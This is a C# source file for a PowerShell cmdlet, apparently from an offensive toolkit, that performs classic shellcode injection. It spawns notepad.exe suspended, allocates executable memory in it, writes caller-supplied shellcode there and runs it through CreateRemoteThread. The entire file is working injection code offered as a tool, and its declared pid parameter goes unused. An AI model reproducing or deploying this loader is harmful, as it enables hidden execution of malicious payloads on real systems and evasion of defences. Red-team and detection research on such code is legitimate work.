using System;
using System.Runtime.InteropServices;
using System.Management.Automation;
using TurtleToolKitManaged;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "InjectionTest")] // <- seeting cmdlet name and verbs
    //[OutputType(typeof(ShellCodeEncryptedOutput))]       // <-- setting output type
    [Alias("TEST")] //<- cmdlet alias
    public class InvokeInjectionTest : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("p")] public int pid { get; set; }
        [Parameter(Mandatory = true)] [Alias("s")] public byte[] shellCode { get; set; }

        // Init cmdlet
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            // perform decryption and injection
            if (!ExecuteClassicInjection(shellCode, pid))
            {
                WriteWarning("Failed to execute classic injection");
                return;
            }
            WriteVerbose("Successfully Executed Classic Injection");
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        private bool ExecuteClassicInjection(byte[] shellcode, int processId)
        {
            // to do add error better error checking
            try
            {

                Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
                string path = "C:\\windows\\system32\\notepad.exe";
                bool res = Win32.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
                Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess; // process handle
                Console.WriteLine(pi.dwProcessId);
                int payloadSize = shellcode.Length;
                IntPtr outSize;
                //IntPtr hProcessTwo = Win32.OpenProcess(0x001F0FFF, false, pi.dwProcessId);
                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero,(uint)shellcode.Length, 0x3000, 0x40);
                if (!Win32.WriteProcessMemory(hProcess, addr, shellcode, payloadSize, out outSize))
                {
                    Console.WriteLine("failed to write process memory {0}",Marshal.GetLastWin32Error());
                    return false;
                }
                IntPtr hThread = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                Win32.ResumeThread(pi.Thread);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("Failed to execute classic injection");
                Console.WriteLine(e);
                return false;
            }
        }
    }
}
